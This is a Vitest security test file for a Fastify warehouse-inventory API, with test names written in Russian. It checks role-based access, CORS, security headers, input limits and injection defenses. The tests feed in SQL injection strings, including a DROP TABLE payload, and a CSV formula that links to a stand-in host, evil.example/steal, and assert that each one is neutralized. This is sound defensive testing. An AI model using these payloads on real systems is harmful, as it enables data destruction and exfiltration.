import Fastify from 'fastify';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { accessPlugin } from '../src/plugins/access';
import { addProduct, createWorld, receive, type World } from './fixtures';
import { call, createTestEnv, type TestEnv } from './helpers';

let env: TestEnv;
let w: World;

beforeAll(async () => {
  env = await createTestEnv({ APP_ORIGINS: 'http://localhost:5173' });
});
afterAll(() => env.close());
beforeEach(async () => {
  await env.reset();
  w = await createWorld(env);
});

describe('объявление прав на маршрутах', () => {
  it('маршрут под /api без config.access не регистрируется', async () => {
    const bare = Fastify();
    await bare.register(accessPlugin, { deps: { db: env.db, config: env.config, clock: () => new Date(), notifier: env.notifier, log: console } });
    let failure: unknown;
    try {
      bare.get('/api/forgotten', async () => 'открыто всем');
      await bare.ready();
    } catch (err) {
      failure = err;
    }
    expect(String(failure)).toMatch(/не объявил права доступа/);
    await bare.close().catch(() => undefined);
  });
});

describe('матрица ролей', () => {
  type Case = { method: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE'; url: string; body?: () => unknown; expect: Record<'anon' | 'viewer' | 'keeper' | 'manager' | 'admin', number> };

  const cases = (): Case[] => [
    { method: 'GET', url: '/api/users', expect: { anon: 401, viewer: 403, keeper: 403, manager: 403, admin: 200 } },
    { method: 'GET', url: '/api/audit', expect: { anon: 401, viewer: 403, keeper: 403, manager: 403, admin: 200 } },
    { method: 'GET', url: '/api/api-keys', expect: { anon: 401, viewer: 403, keeper: 403, manager: 403, admin: 200 } },
    { method: 'GET', url: '/api/settings', expect: { anon: 401, viewer: 200, keeper: 200, manager: 200, admin: 200 } },
    { method: 'GET', url: '/api/products', expect: { anon: 401, viewer: 200, keeper: 200, manager: 200, admin: 200 } },
    { method: 'GET', url: '/api/reports/stock.csv', expect: { anon: 401, viewer: 403, keeper: 403, manager: 200, admin: 200 } },
    { method: 'GET', url: '/api/analytics/dashboard', expect: { anon: 401, viewer: 200, keeper: 200, manager: 200, admin: 200 } },
    {
      method: 'POST',
      url: '/api/categories',
      body: () => ({ name: `Категория ${Math.random()}` }),
      expect: { anon: 401, viewer: 403, keeper: 403, manager: 201, admin: 201 },
    },
    {
      method: 'POST',
      url: '/api/documents/writeoffs/expired',
      body: () => ({ locationId: w.locA.id }),
      expect: { anon: 401, viewer: 403, keeper: 422, manager: 422, admin: 422 },
    },
    {
      method: 'POST',
      url: '/api/stop-list/manual',
      body: () => ({ locationId: w.locA.id, reason: 'x' }),
      expect: { anon: 401, viewer: 403, keeper: 403, manager: 400, admin: 400 },
    },
    { method: 'PUT', url: '/api/settings', body: () => ({ digestHour: 9 }), expect: { anon: 401, viewer: 403, keeper: 403, manager: 403, admin: 400 } },
  ];

  it('каждая роль получает ожидаемый ответ', async () => {
    const tokens = { anon: null, viewer: w.viewerA.token, keeper: w.keeperA.token, manager: w.manager.token, admin: w.admin.token } as const;
    for (const c of cases()) {
      for (const [role, token] of Object.entries(tokens) as [keyof typeof tokens, string | null][]) {
        const res = await call(env, token)(c.method, c.url, c.body?.());
        expect(res.statusCode, `${role} ${c.method} ${c.url}: ${res.body.slice(0, 120)}`).toBe(c.expect[role]);
      }
    }
  });
});

describe('доступ к чужим объектам по идентификатору', () => {
  it('партия, документ, инвентаризация и акция чужой точки недоступны', async () => {
    const p = await addProduct(env, w.categoryId);
    const doc = await receive(env, w.manager.token, w.locB.id, [{ productId: p, quantity: 5, expiresOn: w.day(2) }]);
    const batch = await env.db.selectFrom('batches').select('id').where('location_id', '=', w.locB.id).executeTakeFirstOrThrow();
    const promo = await call(env, w.manager.token)('POST', '/api/promotions', { batchId: batch.id, percent: 20 });
    const inv = await call(env, w.manager.token)('POST', '/api/inventories', { locationId: w.locB.id });

    const keeper = call(env, w.keeperA.token);
    expect((await keeper('GET', `/api/stock/batches/${batch.id}`)).statusCode).toBe(404);
    expect((await keeper('GET', `/api/documents/${doc.documentId}`)).statusCode).toBe(404);
    expect((await keeper('GET', `/api/inventories/${inv.json().id}`)).statusCode).toBe(404);
    expect((await keeper('PUT', `/api/inventories/${inv.json().id}/lines`, { lines: [{ productId: p, countedQty: 1 }] })).statusCode).toBe(404);
    expect((await call(env, w.keeperA.token)('POST', '/api/promotions', { batchId: batch.id, percent: 10 })).statusCode).toBe(403);
    expect((await call(env, w.manager.token)('DELETE', `/api/promotions/${promo.json().id}`)).statusCode).toBe(204);
  });

  it('списки по умолчанию ограничены доступными точками', async () => {
    const p = await addProduct(env, w.categoryId);
    await receive(env, w.manager.token, w.locA.id, [{ productId: p, quantity: 1, expiresOn: w.day(5) }]);
    await receive(env, w.manager.token, w.locB.id, [{ productId: p, quantity: 1, expiresOn: w.day(5) }]);
    const viewer = call(env, w.viewerA.token);
    const batches = (await viewer('GET', '/api/stock/batches')).json();
    expect(batches.items.map((b: { locationId: string }) => b.locationId)).toEqual([w.locA.id]);
    expect((await viewer('GET', `/api/stock/batches?locationId=${w.locB.id}`)).statusCode).toBe(404);
    const locations = (await viewer('GET', '/api/locations')).json();
    expect(locations.map((l: { id: string }) => l.id)).toEqual([w.locA.id]);
    const movements = (await viewer('GET', '/api/stock/movements')).json();
    expect(movements.items.every((m: { locationId: string }) => m.locationId === w.locA.id)).toBe(true);
    const summary = (await viewer('GET', '/api/stock/summary')).json();
    expect(summary.items.every((r: { locationId: string }) => r.locationId === w.locA.id)).toBe(true);
  });
});

describe('заголовки и транспорт', () => {
  it('ставит защитные заголовки и убирает отпечаток сервера', async () => {
    const res = await env.app.inject({ method: 'GET', url: '/api/health' });
    const h = res.headers;
    expect(h['content-security-policy']).toContain("default-src 'self'");
    expect(h['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(h['content-security-policy']).toContain("object-src 'none'");
    expect(h['content-security-policy']).not.toContain('unsafe-inline');
    expect(h['content-security-policy']).not.toContain('unsafe-eval');
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(h['x-frame-options']).toBe('DENY');
    expect(h['referrer-policy']).toBe('no-referrer');
    expect(h['permissions-policy']).toContain('camera=(self)');
    expect(h['permissions-policy']).toContain('microphone=()');
    expect(h['cross-origin-opener-policy']).toBe('same-origin');
    expect(h['x-powered-by']).toBeUndefined();
    expect(h['cache-control']).toBe('no-store');
    expect(h['x-request-id']).toMatch(/^[0-9a-f-]{36}$/);
  });

  it('CORS пропускает только настроенный источник', async () => {
    const allowed = await env.app.inject({ method: 'OPTIONS', url: '/api/products', headers: { origin: 'http://localhost:5173', 'access-control-request-method': 'GET' } });
    expect(allowed.headers['access-control-allow-origin']).toBe('http://localhost:5173');
    expect(allowed.headers['access-control-allow-credentials']).toBe('true');
    const evil = await env.app.inject({ method: 'OPTIONS', url: '/api/products', headers: { origin: 'https://evil.example', 'access-control-request-method': 'GET' } });
    expect(evil.headers['access-control-allow-origin']).toBeUndefined();
  });

  it('режет слишком большое и битое тело, чужой тип данных', async () => {
    const big = await env.app.inject({ method: 'POST', url: '/api/auth/login', payload: { email: 'a@b.ru', password: 'x'.repeat(300_000) } });
    expect(big.statusCode).toBe(413);
    expect(big.json().error.code).toBe('payload_too_large');
    const broken = await env.app.inject({ method: 'POST', url: '/api/auth/login', headers: { 'content-type': 'application/json' }, payload: '{"email": ' });
    expect(broken.statusCode).toBe(400);
    const plain = await env.app.inject({ method: 'POST', url: '/api/auth/login', headers: { 'content-type': 'text/plain' }, payload: 'email=a' });
    expect(plain.statusCode).toBe(400);
    const xml = await env.app.inject({ method: 'POST', url: '/api/auth/login', headers: { 'content-type': 'application/xml' }, payload: '<a/>' });
    expect(xml.statusCode).toBe(415);
  });

  it('ошибки не раскрывают устройство сервера', async () => {
    const res = await call(env, w.manager.token)('GET', '/api/products/not-a-uuid');
    expect(res.statusCode).toBe(400);
    const body = res.json();
    expect(body.error.code).toBe('validation_error');
    expect(body.requestId).toBe(res.headers['x-request-id']);
    expect(res.body).not.toMatch(/stack|node_modules|select |kysely|pg\b/i);
    const missing = await env.app.inject({ method: 'GET', url: '/api/nothing-here' });
    expect(missing.statusCode).toBe(404);
    expect(missing.json().error.code).toBe('not_found');
  });
});

describe('внедрение и массовое присвоение', () => {
  it('поисковая строка не меняет запрос', async () => {
    await addProduct(env, w.categoryId, { name: "Масло 'Крестьянское'" });
    const api = call(env, w.viewerA.token);
    for (const q of ["' OR 1=1 --", "'; DROP TABLE products; --", '%', '_', '\\']) {
      const res = await api('GET', `/api/products?q=${encodeURIComponent(q)}`);
      expect(res.statusCode, q).toBe(200);
      expect(res.json().items, q).toHaveLength(0);
    }
    const quote = await api('GET', `/api/products?q=${encodeURIComponent("'Крестьянское'")}`);
    expect(quote.json().items).toHaveLength(1);
    expect(await env.db.selectFrom('products').select('id').execute()).toHaveLength(1);
  });

  it('лишние поля в теле отклоняются', async () => {
    const p = await addProduct(env, w.categoryId);
    const manager = call(env, w.manager.token);
    expect((await manager('PATCH', `/api/products/${p}`, { price: 10, isAdmin: true })).statusCode).toBe(400);
    expect((await call(env, w.admin.token)('PATCH', `/api/users/${w.keeperA.userId}`, { role: 'admin', passwordHash: 'x' })).statusCode).toBe(400);
    expect((await manager('POST', '/api/categories', { name: 'Ок', id: '00000000-0000-4000-8000-000000000000' })).statusCode).toBe(400);
  });

  it('формулы в данных попадают в CSV безопасным текстом', async () => {
    const evil = '=HYPERLINK("http://evil.example/steal","Нажми")';
    const created = await call(env, w.manager.token)('POST', '/api/products', {
      sku: 'EVIL-1',
      name: evil,
      categoryId: w.categoryId,
      unit: 'kg',
      price: 10,
      cost: 5,
    });
    expect(created.statusCode).toBe(201);
    await receive(env, w.manager.token, w.locA.id, [{ productId: created.json().id, quantity: 1, expiresOn: w.day(5) }]);
    const csv = await call(env, w.manager.token)('GET', '/api/reports/stock.csv');
    expect(csv.statusCode).toBe(200);
    expect(csv.headers['content-type']).toContain('text/csv');
    expect(csv.headers['content-disposition']).toMatch(/attachment; filename="stock-\d{4}-\d{2}-\d{2}\.csv"/);
    expect(csv.body.startsWith('﻿')).toBe(true);
    expect(csv.body).toContain('"\'=HYPERLINK(""http://evil.example/steal"",""Нажми"")"');
    expect(csv.body).not.toMatch(/;=HYPERLINK/);
  });
});
